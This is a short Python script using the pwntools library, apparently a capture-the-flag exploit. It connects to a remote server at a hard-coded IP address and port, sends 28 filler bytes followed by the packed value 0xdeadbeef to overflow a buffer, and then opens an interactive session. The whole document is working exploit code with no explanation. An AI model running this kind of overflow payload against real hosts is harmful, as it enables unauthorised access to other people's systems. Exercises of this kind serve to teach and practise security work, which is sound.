from pwn import *

r = remote('120.114.62.211',6125)

payload = b'A'*28

r.sendline(payload+p64(0xdeadbeef))

r.interactive()
